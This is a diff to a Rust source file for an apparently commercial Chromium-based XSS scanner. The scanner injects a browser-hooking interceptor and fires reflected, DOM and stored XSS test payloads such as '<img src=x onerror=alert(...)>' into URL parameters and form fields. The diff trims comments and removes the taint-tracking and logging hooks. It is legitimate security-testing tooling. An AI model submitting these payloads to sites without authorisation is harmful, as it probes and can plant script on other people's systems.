@@ -28,7 +28,6 @@ const XSS_INTERCEPTOR: &str = r#"
     window.__xssMessage = '';
     window.__xssExecutions = [];
     window.__xssSeverity = 'none';
-    window.__xssTaintedData = new Map(); // Source tagging: track tainted inputs
 
     // Severity levels: CRITICAL > HIGH > MEDIUM > LOW
     const SINK_SEVERITY = {
@@ -63,7 +62,7 @@ const XSS_INTERCEPTOR: &str = r#"
         try {
             throw new Error('XSS-STACK');
         } catch (e) {
-            return e.stack.split('\n').slice(2, 8).join('\n'); // Skip first 2 lines (Error + this func)
+            return e.stack.split('\n').slice(2, 8).join('\n');
         }
     }
 
@@ -85,239 +84,17 @@ const XSS_INTERCEPTOR: &str = r#"
         console.log('[XSS-DETECTED]', type + ':', content, 'severity:', window.__xssSeverity);
     }
 
-    // SOURCE TAGGING: Track user input sources
-    // Hook location.search (URL params)
-    try {
-        const origSearch = Object.getOwnPropertyDescriptor(Location.prototype, 'search');
-        if (origSearch && origSearch.get) {
-            Object.defineProperty(Location.prototype, 'search', {
-                get: function() {
-                    const val = origSearch.get.call(this);
-                    if (checkMarker(val)) {
-                        window.__xssTaintedData.set('location.search', val);
-                    }
-                    return val;
-                },
-                configurable: true
-            });
-        }
-    } catch(e) {}
-
-    // Hook location.hash (URL fragment)
-    try {
-        const origHash = Object.getOwnPropertyDescriptor(Location.prototype, 'hash');
-        if (origHash && origHash.get) {
-            Object.defineProperty(Location.prototype, 'hash', {
-                get: function() {
-                    const val = origHash.get.call(this);
-                    if (checkMarker(val)) {
-                        window.__xssTaintedData.set('location.hash', val);
-                    }
-                    return val;
-                },
-                configurable: true
-            });
-        }
-    } catch(e) {}
-
-    // Hook document.cookie
-    try {
-        const origCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
-        if (origCookie && origCookie.get) {
-            Object.defineProperty(Document.prototype, 'cookie', {
-                get: function() {
-                    const val = origCookie.get.call(this);
-                    if (checkMarker(val)) {
-                        window.__xssTaintedData.set('document.cookie', val);
-                    }
-                    return val;
-                },
-                set: origCookie.set,
-                configurable: true
-            });
-        }
-    } catch(e) {}
-
-    // Hook localStorage
-    const origLocalGetItem = localStorage.getItem.bind(localStorage);
-    localStorage.getItem = function(key) {
-        const val = origLocalGetItem(key);
-        if (val && checkMarker(val)) {
-            window.__xssTaintedData.set('localStorage.' + key, val);
-        }
-        return val;
-    };
-
-    // Hook sessionStorage
-    const origSessionGetItem = sessionStorage.getItem.bind(sessionStorage);
-    sessionStorage.getItem = function(key) {
-        const val = origSessionGetItem(key);
-        if (val && checkMarker(val)) {
-            window.__xssTaintedData.set('sessionStorage.' + key, val);
-        }
-        return val;
-    };
-
-    // Hook postMessage listener (with origin tracking)
-    window.addEventListener('message', function(e) {
-        try {
-            const data = JSON.stringify(e.data);
-            if (checkMarker(data)) {
-                window.__xssTaintedData.set('postMessage', {
-                    data: data.substring(0, 200),
-                    origin: e.origin,
-                    source: e.source === window ? 'self' : 'other'
-                });
-            }
-        } catch(err) {}
-    }, true);
-
-    // FLOW-BASED TAINT TRACKING (minimal)
-    // Carry taint metadata through string operations
-    const TAINT_SYMBOL = Symbol('__tainted');
-
-    function taintString(str, source) {
-        if (typeof str !== 'string') return str;
-        const tainted = new String(str);
-        tainted[TAINT_SYMBOL] = {source: source, tainted: true};
-        return tainted;
-    }
-
-    function isTainted(str) {
-        return str && str[TAINT_SYMBOL] && str[TAINT_SYMBOL].tainted;
-    }
-
-    // Hook String.prototype methods to propagate taint
-    const origConcat = String.prototype.concat;
-    String.prototype.concat = function(...args) {
-        const result = origConcat.apply(this, args);
-        // If any input is tainted, result is tainted
-        if (isTainted(this) || args.some(isTainted)) {
-            return taintString(result, 'concat');
-        }
-        return result;
-    };
-
-    const origReplace = String.prototype.replace;
-    String.prototype.replace = function(searchValue, replaceValue) {
-        const result = origReplace.call(this, searchValue, replaceValue);
-        if (isTainted(this) || isTainted(replaceValue)) {
-            return taintString(result, 'replace');
-        }
-        return result;
-    };
-
-    const origSlice = String.prototype.slice;
-    String.prototype.slice = function(start, end) {
-        const result = origSlice.call(this, start, end);
-        if (isTainted(this)) {
-            return taintString(result, 'slice');
-        }
-        return result;
-    };
-
-    const origSubstring = String.prototype.substring;
-    String.prototype.substring = function(start, end) {
-        const result = origSubstring.call(this, start, end);
-        if (isTainted(this)) {
-            return taintString(result, 'substring');
-        }
-        return result;
-    };
-
-    const origSubstr = String.prototype.substr;
-    String.prototype.substr = function(start, length) {
-        const result = origSubstr.call(this, start, length);
-        if (isTainted(this)) {
-            return taintString(result, 'substr');
-        }
-        return result;
-    };
-
-    const origSplit = String.prototype.split;
-    String.prototype.split = function(separator, limit) {
-        const result = origSplit.call(this, separator, limit);
-        if (isTainted(this)) {
-            return result.map(s => taintString(s, 'split'));
-        }
-        return result;
-    };
-
-    // Hook toString/valueOf for implicit coercion taint propagation
-    const origToString = String.prototype.toString;
-    String.prototype.toString = function() {
-        const result = origToString.call(this);
-        if (isTainted(this)) return taintString(result, 'toString');
-        return result;
-    };
-
-    const origValueOf = String.prototype.valueOf;
-    String.prototype.valueOf = function() {
-        const result = origValueOf.call(this);
-        if (isTainted(this)) return taintString(result, 'valueOf');
-        return result;
-    };
-
-    // Taint URL parameters on access
-    try {
-        const origURLSearchParamsGet = URLSearchParams.prototype.get;
-        URLSearchParams.prototype.get = function(name) {
-            const val = origURLSearchParamsGet.call(this, name);
-            if (val && checkMarker(val)) {
-                return taintString(val, 'URLSearchParams.get');
-            }
-            return val;
-        };
-    } catch(e) {}
-
-    // TRUSTED TYPES HOOKS
-    if (window.trustedTypes) {
-        const origCreatePolicy = window.trustedTypes.createPolicy.bind(window.trustedTypes);
-        window.trustedTypes.createPolicy = function(name, rules) {
-            recordExecution('trusted-types-policy', name, 'trustedTypes');
-            const policy = origCreatePolicy(name, rules);
-            // Wrap policy methods to detect marker usage
-            const origCreateHTML = policy.createHTML?.bind(policy);
-            const origCreateScript = policy.createScript?.bind(policy);
-            const origCreateScriptURL = policy.createScriptURL?.bind(policy);
-
-            if (origCreateHTML) {
-                policy.createHTML = function(input) {
-                    if (checkMarker(input)) recordExecution('trusted-types-html', input, 'trustedTypes');
-                    return origCreateHTML(input);
-                };
-            }
-            if (origCreateScript) {
-                policy.createScript = function(input) {
-                    if (checkMarker(input)) recordExecution('trusted-types-script', input, 'trustedTypes');
-                    return origCreateScript(input);
-                };
-            }
-            if (origCreateScriptURL) {
-                policy.createScriptURL = function(input) {
-                    if (checkMarker(input)) recordExecution('trusted-types-url', input, 'trustedTypes');
-                    return origCreateScriptURL(input);
-                };
-            }
-            return policy;
-        };
-    }
-
     // IFRAME RECURSIVE INJECTION
-    // Inject interceptor into same-origin iframes
     function injectIntoFrame(frame) {
         try {
             if (!frame.contentWindow || !frame.contentDocument) return;
-            // Check same-origin
-            try { frame.contentDocument.body; } catch(e) { return; } // Cross-origin, skip
+            try { frame.contentDocument.body; } catch(e) { return; }
 
-            // Inject our marker
             frame.contentWindow.__xssMarker = window.__xssMarker;
             frame.contentWindow.__xssTriggered = false;
             frame.contentWindow.__xssTriggerType = 'none';
             frame.contentWindow.__xssExecutions = [];
 
-            // Hook alert/confirm/prompt in frame
             frame.contentWindow.alert = function(msg) {
                 if (checkMarker(msg)) {
                     window.__xssTriggered = true;
@@ -339,10 +116,10 @@ const XSS_INTERCEPTOR: &str = r#"
                 }
                 return '';
             };
-        } catch(e) { /* cross-origin or security error */ }
+        } catch(e) {}
     }
 
-    // Hook iframe creation to inject into new iframes
+    // Hook iframe creation
     const origCreateElement = document.createElement.bind(document);
     document.createElement = function(tagName, options) {
         const el = origCreateElement(tagName, options);
@@ -354,10 +131,8 @@ const XSS_INTERCEPTOR: &str = r#"
         return el;
     };
 
-    // Inject into existing iframes
     document.querySelectorAll('iframe').forEach(injectIntoFrame);
 
-    // Watch for dynamically added iframes
     const iframeObserver = new MutationObserver(function(mutations) {
         for (const mutation of mutations) {
             for (const node of mutation.addedNodes) {
@@ -371,14 +146,9 @@ const XSS_INTERCEPTOR: &str = r#"
         iframeObserver.observe(document.body, {childList: true, subtree: true});
     }
 
-    // 1. Dialog interception (alert, confirm, prompt)
-    window.__originalAlert = window.alert;
-    window.__originalConfirm = window.confirm;
-    window.__originalPrompt = window.prompt;
-
+    // 1. Dialog interception
     window.alert = function(msg) {
         if (checkMarker(msg)) recordExecution('alert', msg);
-        // Don't call original - avoid blocking
     };
 
     window.confirm = function(msg) {
@@ -391,7 +161,7 @@ const XSS_INTERCEPTOR: &str = r#"
         return def || '';
     };
 
-    // 2. DOM Sink hooking - detect marker reaching innerHTML, outerHTML, etc.
+    // 2. DOM Sink hooking
     const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
     if (originalInnerHTMLDescriptor && originalInnerHTMLDescriptor.set) {
         Object.defineProperty(Element.prototype, 'innerHTML', {
@@ -446,7 +216,7 @@ const XSS_INTERCEPTOR: &str = r#"
         return new OriginalFunction(...args);
     };
 
-    // 5. setTimeout/setInterval with string (dangerous)
+    // 5. setTimeout/setInterval with string
     const originalSetTimeout = window.setTimeout;
     const originalSetInterval = window.setInterval;
     window.setTimeout = function(fn, delay, ...args) {
@@ -465,7 +235,7 @@ const XSS_INTERCEPTOR: &str = r#"
         return originalInsertAdjacentHTML.call(this, position, text);
     };
 
-    // 6b. setAttribute - CRITICAL for event handler injection (onclick, onerror, etc)
+    // 6b. setAttribute for event handlers
     const origSetAttribute = Element.prototype.setAttribute;
     Element.prototype.setAttribute = function(name, value) {
         if (typeof value === 'string' && checkMarker(value) && name.toLowerCase().startsWith('on')) {
@@ -474,8 +244,7 @@ const XSS_INTERCEPTOR: &str = r#"
         return origSetAttribute.call(this, name, value);
     };
 
-    // 7. Hook fetch with RESPONSE body monitoring AND request logging for replay
-    window.__xssRequests = [];
+    // 7. Hook fetch
     const originalFetch = window.fetch;
     window.fetch = async function(...args) {
         const [url, options] = args;
@@ -490,17 +259,10 @@ const XSS_INTERCEPTOR: &str = r#"
             }
         } catch(e) {}
 
-        // ALWAYS log fetch requests for replay
-        window.__xssRequests.push({
-            type: 'fetch',
-            url: String(url),
-            method: options?.method || 'GET'
-        });
-
         return res;
     };
 
-    // 7b. Hook XHR with response monitoring AND request logging
+    // 7b. Hook XHR
     const origXHROpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, ...rest) {
         this.__xssUrl = url;
@@ -512,23 +274,10 @@ const XSS_INTERCEPTOR: &str = r#"
                 }
             } catch(e) {}
         });
-
-        // Log XHR for replay
-        window.__xssRequests.push({
-            type: 'xhr',
-            url: String(url),
-            method: method
-        });
-
         return origXHROpen.call(this, method, url, ...rest);
     };
 
-    // 7c. NOTE: textContent and innerText are NOT XSS sinks!
-    // They set text content which is always HTML-encoded by the browser.
-    // el.textContent = '<script>alert(1)</script>' displays as literal text, not code.
-    // We deliberately DO NOT hook these to avoid false positives.
-
-    // 8. Location changes (open redirect / JS redirect)
+    // 8. Location changes
     const originalLocationAssign = window.location.assign;
     const originalLocationReplace = window.location.replace;
     if (originalLocationAssign) {
@@ -544,16 +293,14 @@ const XSS_INTERCEPTOR: &str = r#"
         };
     }
 
-    // 9. DOM Mutation Observer - detect marker appearing in DANGEROUS contexts only
-    // CRITICAL: Text reflection is NOT XSS! The script must actually execute.
+    // 9. DOM Mutation Observer - DANGEROUS contexts only
     const observer = new MutationObserver(function(mutations) {
         for (const mutation of mutations) {
             if (mutation.type === 'childList') {
                 for (const node of mutation.addedNodes) {
-                    if (node.nodeType === 1) { // Element
+                    if (node.nodeType === 1) {
                         const tagName = node.tagName ? node.tagName.toUpperCase() : '';
 
-                        // REAL XSS: Script tag was injected and will execute
                         if (tagName === 'SCRIPT') {
                             const content = node.textContent || node.src || '';
                             if (checkMarker(content)) {
@@ -561,7 +308,6 @@ const XSS_INTERCEPTOR: &str = r#"
                             }
                         }
 
-                        // Check for injected script tags inside the element
                         const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
                         for (const script of scripts) {
                             const scriptContent = script.textContent || script.src || '';
@@ -570,7 +316,6 @@ const XSS_INTERCEPTOR: &str = r#"
                             }
                         }
 
-                        // Check for dangerous event handlers on the element
                         const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur'];
                         for (const attr of dangerousAttrs) {
                             const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
@@ -579,7 +324,6 @@ const XSS_INTERCEPTOR: &str = r#"
                             }
                         }
 
-                        // Check for javascript: URLs in href/src
                         const href = node.getAttribute ? node.getAttribute('href') : null;
                         const src = node.getAttribute ? node.getAttribute('src') : null;
                         if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
@@ -588,25 +332,18 @@ const XSS_INTERCEPTOR: &str = r#"
                         if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
                             recordExecution('DOM-javascript-url', src);
                         }
-
-                        // NOTE: Do NOT report text-only reflections like <div>MARKER</div>
-                        // That's NOT XSS - the script is HTML-encoded and not executing
                     }
-                    // NOTE: Text nodes (nodeType 3) are NEVER XSS by themselves
-                    // Text content is always safe - it's just displayed text
                 }
             } else if (mutation.type === 'attributes') {
                 const attrName = mutation.attributeName.toLowerCase();
                 const value = mutation.target.getAttribute(mutation.attributeName) || '';
 
-                // Only report dangerous attribute mutations
                 const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
                                         'onkeydown', 'onkeyup', 'onsubmit', 'onchange', 'oninput'];
                 if (dangerousAttrs.includes(attrName) && checkMarker(value)) {
                     recordExecution('DOM-attr-event', attrName + '=' + value);
                 }
 
-                // javascript: URLs in href/src
                 if ((attrName === 'href' || attrName === 'src') &&
                     value.toLowerCase().startsWith('javascript:') && checkMarker(value)) {
                     recordExecution('DOM-attr-javascript-url', value);
@@ -615,7 +352,6 @@ const XSS_INTERCEPTOR: &str = r#"
         }
     });
 
-    // Start observing when DOM is ready
     if (document.body) {
         observer.observe(document.body, {childList: true, subtree: true, attributes: true});
     } else {
@@ -624,17 +360,7 @@ const XSS_INTERCEPTOR: &str = r#"
         });
     }
 
-    // 10. Console error hook for CSP violations
-    const originalConsoleError = console.error;
-    console.error = function(...args) {
-        const msg = args.join(' ');
-        if (msg.includes('Content Security Policy') || msg.includes('CSP')) {
-            recordExecution('CSP-violation', msg);
-        }
-        return originalConsoleError.apply(console, args);
-    };
-
-    // 11. Image/Script src hooking (for data exfil detection)
+    // 10. Image src hooking
     const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
     if (originalImageSrc && originalImageSrc.set) {
         Object.defineProperty(HTMLImageElement.prototype, 'src', {
@@ -647,13 +373,11 @@ const XSS_INTERCEPTOR: &str = r#"
         });
     }
 
-    // 12. Shadow DOM support - hook attachShadow to monitor shadow roots
-    // CRITICAL: Only detect EXECUTABLE contexts, not text reflections
+    // 11. Shadow DOM support
     const originalAttachShadow = Element.prototype.attachShadow;
     Element.prototype.attachShadow = function(init) {
         const shadowRoot = originalAttachShadow.call(this, init);
 
-        // Observe shadow root for mutations - only EXECUTABLE contexts
         const shadowObserver = new MutationObserver(function(mutations) {
             for (const mutation of mutations) {
                 if (mutation.type === 'childList') {
@@ -661,7 +385,6 @@ const XSS_INTERCEPTOR: &str = r#"
                         if (node.nodeType === 1) {
                             const tagName = node.tagName ? node.tagName.toUpperCase() : '';
 
-                            // 1. Script tags in shadow DOM = real execution
                             if (tagName === 'SCRIPT') {
                                 const content = node.textContent || node.src || '';
                                 if (checkMarker(content)) {
@@ -669,7 +392,6 @@ const XSS_INTERCEPTOR: &str = r#"
                                 }
                             }
 
-                            // 2. Check for script tags inside the added element
                             const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
                             for (const script of scripts) {
                                 const scriptContent = script.textContent || script.src || '';
@@ -678,7 +400,6 @@ const XSS_INTERCEPTOR: &str = r#"
                                 }
                             }
 
-                            // 3. Check for dangerous event handlers on the element
                             const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];
                             for (const attr of dangerousAttrs) {
                                 const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
@@ -687,7 +408,6 @@ const XSS_INTERCEPTOR: &str = r#"
                                 }
                             }
 
-                            // 4. Check for javascript: URLs
                             const href = node.getAttribute ? node.getAttribute('href') : null;
                             const src = node.getAttribute ? node.getAttribute('src') : null;
                             if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
@@ -696,8 +416,6 @@ const XSS_INTERCEPTOR: &str = r#"
                             if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
                                 recordExecution('shadow-DOM-javascript-url', src, 'shadow-root');
                             }
-
-                            // NOTE: Do NOT flag text-only reflections in shadow DOM either
                         }
                     }
                 }
@@ -705,7 +423,6 @@ const XSS_INTERCEPTOR: &str = r#"
         });
         shadowObserver.observe(shadowRoot, {childList: true, subtree: true});
 
-        // Hook innerHTML on shadow root - this IS a dangerous sink
         const origShadowInnerHTML = Object.getOwnPropertyDescriptor(ShadowRoot.prototype, 'innerHTML');
         if (origShadowInnerHTML && origShadowInnerHTML.set) {
             Object.defineProperty(shadowRoot, 'innerHTML', {
@@ -721,7 +438,7 @@ const XSS_INTERCEPTOR: &str = r#"
         return shadowRoot;
     };
 
-    // 13. Script element src and textContent hooking
+    // 12. Script element src
     const originalScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
     if (originalScriptSrc && originalScriptSrc.set) {
         Object.defineProperty(HTMLScriptElement.prototype, 'src', {
@@ -734,7 +451,7 @@ const XSS_INTERCEPTOR: &str = r#"
         });
     }
 
-    // 14. Iframe src hooking (can be used for XSS via javascript: URLs)
+    // 13. Iframe src
     const originalIframeSrc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
     if (originalIframeSrc && originalIframeSrc.set) {
         Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
@@ -749,7 +466,7 @@ const XSS_INTERCEPTOR: &str = r#"
         });
     }
 
-    // 14b. Iframe srcdoc hooking (executes BEFORE load event)
+    // 13b. Iframe srcdoc
     const origSrcdoc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'srcdoc');
     if (origSrcdoc && origSrcdoc.set) {
         Object.defineProperty(HTMLIFrameElement.prototype, 'srcdoc', {
@@ -762,42 +479,14 @@ const XSS_INTERCEPTOR: &str = r#"
         });
     }
 
-    // 15. Object/Embed data attribute (for plugin-based XSS)
-    const originalObjectData = Object.getOwnPropertyDescriptor(HTMLObjectElement.prototype, 'data');
-    if (originalObjectData && originalObjectData.set) {
-        Object.defineProperty(HTMLObjectElement.prototype, 'data', {
-            set: function(value) {
-                if (checkMarker(value)) recordExecution('object.data', value, 'object-element');
-                return originalObjectData.set.call(this, value);
-            },
-            get: originalObjectData.get,
-            configurable: true
-        });
-    }
-
-    // 16. Link href hooking (javascript: URLs)
-    const originalLinkHref = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'href');
-    if (originalLinkHref && originalLinkHref.set) {
-        Object.defineProperty(HTMLAnchorElement.prototype, 'href', {
-            set: function(value) {
-                if (value && (checkMarker(value) || value.startsWith('javascript:'))) {
-                    recordExecution('a.href', value, 'anchor-element');
-                }
-                return originalLinkHref.set.call(this, value);
-            },
-            get: originalLinkHref.get,
-            configurable: true
-        });
-    }
-
-    // 17. Range.createContextualFragment (another DOM XSS vector)
+    // 14. Range.createContextualFragment
     const originalCreateContextualFragment = Range.prototype.createContextualFragment;
     Range.prototype.createContextualFragment = function(html) {
         if (checkMarker(html)) recordExecution('createContextualFragment', html, 'range-api');
         return originalCreateContextualFragment.call(this, html);
     };
 
-    // 18. DOMParser (can parse HTML with scripts)
+    // 15. DOMParser
     const OriginalDOMParser = window.DOMParser;
     window.DOMParser = function() {
         const parser = new OriginalDOMParser();
@@ -811,12 +500,11 @@ const XSS_INTERCEPTOR: &str = r#"
         return parser;
     };
 
-    console.log('[XSS-SCANNER] Production-grade interceptor installed (dialogs + sinks + DOM + Shadow DOM + sources)');
+    console.log('[XSS-SCANNER] Fast interceptor installed');
 })();
 "#;
 
 /// Shared browser instance for all XSS tests
-/// Uses Arc internally so it can be cloned and shared across threads
 pub struct SharedBrowser {
     browser: Arc<RwLock<Browser>>,
 }
@@ -830,13 +518,12 @@ impl Clone for SharedBrowser {
 }
 
 impl SharedBrowser {
-    /// Create a new shared browser instance
     pub fn new() -> Result<Self> {
         info!("[SharedBrowser] Launching headless Chrome...");
 
         let options = LaunchOptions::default_builder()
             .headless(true)
-            .idle_browser_timeout(Duration::from_secs(300)) // 5 min timeout
+            .idle_browser_timeout(Duration::from_secs(300))
             .build()
             .map_err(|e| anyhow::anyhow!("Failed to build browser options: {}", e))?;
 
@@ -849,31 +536,23 @@ impl SharedBrowser {
         })
     }
 
-    /// Create a new tab with XSS interceptor pre-installed
-    /// Uses CDP Page.addScriptToEvaluateOnNewDocument to inject BEFORE any page JS runs
     pub fn new_tab_with_interceptor(&self, marker: &str) -> Result<Arc<Tab>> {
         let browser = self.browser.read()
             .map_err(|e| anyhow::anyhow!("Failed to lock browser: {}", e))?;
         let tab = browser.new_tab()?;
 
-        // Set shorter timeout for navigation
-        tab.set_default_timeout(Duration::from_secs(10));
+        tab.set_default_timeout(Duration::from_secs(8));
 
-        // Enable JavaScript dialogs to be auto-handled
-        // This ensures dialogs don't block execution
         tab.call_method(headless_chrome::protocol::cdp::Page::Enable {
             enable_file_chooser_opened_event: None,
         })?;
 
-        // Inject interceptor script BEFORE page JS runs using CDP
-        // This is the correct way - runs at document_start
         let setup_js = format!(
             "{}\nwindow.__xssMarker = '{}';",
             XSS_INTERCEPTOR,
             marker
         );
 
-        // Use Page.addScriptToEvaluateOnNewDocument - this injects BEFORE any page JS
         tab.call_method(headless_chrome::protocol::cdp::Page::AddScriptToEvaluateOnNewDocument {
             source: setup_js,
             world_name: None,
@@ -884,9 +563,7 @@ impl SharedBrowser {
         Ok(tab)
     }
 
-    /// Check if browser is still alive
     pub fn is_alive(&self) -> bool {
-        // Try to create a tab to check if browser is responsive
         if let Ok(browser) = self.browser.read() {
             browser.new_tab().is_ok()
         } else {
@@ -895,7 +572,6 @@ impl SharedBrowser {
     }
 }
 
-/// XSS Detection result from Chromium
 #[derive(Debug, Clone)]
 pub struct XssDetectionResult {
     pub xss_triggered: bool,
@@ -907,11 +583,10 @@ pub struct XssDetectionResult {
     pub stack_trace: Option<String>,
     pub source: Option<String>,
     pub timestamp: Option<u64>,
-    pub parameter: Option<String>,     // Which form field(s) were injected
-    pub injection_point: Option<String>, // Where in DOM it was found
+    pub parameter: Option<String>,
+    pub injection_point: Option<String>,
 }
 
-/// How the XSS was triggered
 #[derive(Debug, Clone, PartialEq)]
 pub enum XssTriggerType {
     AlertDialog,
@@ -927,17 +602,15 @@ pub enum XssTriggerType {
     None,
 }
 
-/// XSS severity classification
 #[derive(Debug, Clone, PartialEq)]
 pub enum XssSeverity {
-    Critical, // eval, Function, setTimeout with string
-    High,     // innerHTML, document.write, location changes
-    Medium,   // dialogs, fetch
-    Low,      // DOM mutations, img.src
+    Critical,
+    High,
+    Medium,
+    Low,
     Unknown,
 }
 
-/// Chromium-based XSS Scanner - the ONLY XSS scanner
 pub struct ChromiumXssScanner {
     http_client: Arc<HttpClient>,
     confirmed_vulns: Arc<Mutex<HashSet<String>>>,
@@ -951,14 +624,12 @@ impl ChromiumXssScanner {
         }
     }
 
-    /// Main scan entry point - uses shared browser
     pub async fn scan(
         &self,
         url: &str,
         config: &ScanConfig,
         shared_browser: Option<&SharedBrowser>,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        // Mandatory authorization check
         if !crate::license::verify_scan_authorized() {
             return Ok((Vec::new(), 0));
         }
@@ -969,7 +640,6 @@ impl ChromiumXssScanner {
 
         info!("[Chromium-XSS] Starting real browser XSS scan for: {}", url);
 
-        // Clone shared browser or create temporary one
         let browser: SharedBrowser = match shared_browser {
             Some(b) => b.clone(),
             None => {
@@ -981,7 +651,6 @@ impl ChromiumXssScanner {
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
 
-        // Run all XSS tests in blocking context (headless_chrome is sync)
         let url_owned = url.to_string();
         let mode = config.scan_mode.clone();
 
@@ -995,7 +664,6 @@ impl ChromiumXssScanner {
             if result.xss_triggered {
                 let vuln = self.create_vulnerability(&result)?;
 
-                // Dedup
                 let vuln_key = format!("{}:{:?}", result.url, result.trigger_type);
                 let mut confirmed = self.confirmed_vulns.lock().unwrap();
                 if !confirmed.contains(&vuln_key) {
@@ -1015,7 +683,6 @@ impl ChromiumXssScanner {
         Ok((vulnerabilities, tests_run))
     }
 
-    /// Run all XSS tests synchronously (for headless_chrome)
     fn run_all_xss_tests_sync(
         url: &str,
         mode: &ScanMode,
@@ -1023,17 +690,14 @@ impl ChromiumXssScanner {
     ) -> Result<Vec<XssDetectionResult>> {
         let mut results = Vec::new();
 
-        // Phase 1: Reflected XSS via URL parameters
         info!("[Chromium-XSS] Phase 1: Testing reflected XSS");
         let reflected = Self::test_reflected_xss(url, mode, browser)?;
         results.extend(reflected);
 
-        // Phase 2: DOM XSS via URL hash
         info!("[Chromium-XSS] Phase 2: Testing DOM XSS");
         let dom = Self::test_dom_xss(url, browser)?;
         results.extend(dom);
 
-        // Phase 3: Stored XSS via forms
         info!("[Chromium-XSS] Phase 3: Testing stored XSS");
         let stored = Self::test_stored_xss(url, browser)?;
         results.extend(stored);
@@ -1041,7 +705,6 @@ impl ChromiumXssScanner {
         Ok(results)
     }
 
-    /// Test reflected XSS by injecting payloads into URL parameters
     fn test_reflected_xss(
         url: &str,
         mode: &ScanMode,
@@ -1050,11 +713,10 @@ impl ChromiumXssScanner {
         let mut results = Vec::new();
         let payloads = Self::get_xss_payloads(mode);
 
-        for payload_template in payloads.iter().take(10) { // Limit for speed
+        for payload_template in payloads.iter().take(10) {
             let marker = format!("XSS{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
             let payload = payload_template.replace("MARKER", &marker);
 
-            // Build test URL
             let test_url = if url.contains('?') {
                 format!("{}&xss={}", url, urlencoding::encode(&payload))
             } else {
@@ -1066,7 +728,7 @@ impl ChromiumXssScanner {
                     if result.xss_triggered {
                         info!("[Chromium-XSS] CONFIRMED reflected XSS!");
                         results.push(result);
-                        break; // One confirmed is enough
+                        break;
                     }
                 }
                 Err(e) => debug!("[Chromium-XSS] Reflected test error: {}", e),
@@ -1076,7 +738,6 @@ impl ChromiumXssScanner {
         Ok(results)
     }
 
-    /// Test DOM XSS via URL hash/fragment
     fn test_dom_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
         let mut results = Vec::new();
 
@@ -1106,20 +767,16 @@ impl ChromiumXssScanner {
         Ok(results)
     }
 
-    /// Test stored XSS by submitting forms and checking execution
     fn test_stored_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
         let mut results = Vec::new();
         let marker = format!("STORED{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
 
-        // Navigate to page and find forms
         let tab = browser.new_tab_with_interceptor(&marker)?;
-        tab.set_default_timeout(Duration::from_secs(10));
+        tab.set_default_timeout(Duration::from_secs(8));
         tab.navigate_to(url)?;
 
-        // Wait for page load (reduced from 2s)
-        std::thread::sleep(Duration::from_millis(1500));
+        Self::poll_for_xss_or_stability(&tab, 600, 100);
 
-        // Find forms and their inputs
         let forms_js = r#"
             (function() {
                 const forms = [];
@@ -1154,430 +811,215 @@ impl ChromiumXssScanner {
 
         info!("[Chromium-XSS] Found {} forms to test", forms.len());
 
-        // XSS payloads for stored testing
-        let stored_payloads = vec![
-            format!("<script>alert('{}')</script>", marker),
-            format!("<img src=x onerror=alert('{}')>", marker),
-            format!("<svg onload=alert('{}')>", marker),
-        ];
+        // Single most reliable payload
+        let stored_payload = format!("<img src=x onerror=alert('{}')>", marker);
 
-        for form in forms.iter().take(3) { // Limit forms tested
+        for form in forms.iter().take(3) {
             let inputs = form.get("inputs").and_then(|v| v.as_array()).cloned().unwrap_or_default();
             let form_idx = form.get("index").and_then(|v| v.as_i64()).unwrap_or(0);
 
-            for payload in &stored_payloads {
-                // Reset XSS detection state
-                let _ = tab.evaluate(&format!(
-                    "window.__xssMarker = '{}'; window.__xssTriggered = false; window.__xssTriggerType = 'none'; window.__xssMessage = '';",
-                    marker
-                ), false);
+            let _ = tab.evaluate(&format!(
+                "window.__xssMarker = '{}'; window.__xssTriggered = false; window.__xssTriggerType = 'none'; window.__xssMessage = '';",
+                marker
+            ), false);
 
-                // Fill all text inputs with payload
-                for input in &inputs {
-                    if let Some(selector) = input.get("selector").and_then(|v| v.as_str()) {
-                        if !selector.is_empty() {
-                            // Use JSON encoding for clean escaping
-                            let escaped_selector = selector.replace('\\', "\\\\").replace('"', "\\\"");
-                            let escaped_payload = serde_json::to_string(payload).unwrap_or_else(|_| format!("\"{}\"", payload));
-                            let fill_js = format!(
-                                r#"(function() {{
-                                    const el = document.querySelector("{}");
-                                    if (el) {{
-                                        el.value = {};
-                                        console.log('[XSS-FILL]', el.name || el.id, '=', el.value.substring(0, 50));
-                                    }}
-                                }})()"#,
-                                escaped_selector,
-                                escaped_payload
-                            );
-                            let _ = tab.evaluate(&fill_js, false);
-                        }
+            for input in &inputs {
+                if let Some(selector) = input.get("selector").and_then(|v| v.as_str()) {
+                    if !selector.is_empty() {
+                        let escaped_selector = selector.replace('\\', "\\\\").replace('"', "\\\"");
+                        let escaped_payload = serde_json::to_string(&stored_payload).unwrap_or_else(|_| format!("\"{}\"", stored_payload));
+                        let fill_js = format!(
+                            r#"(function() {{
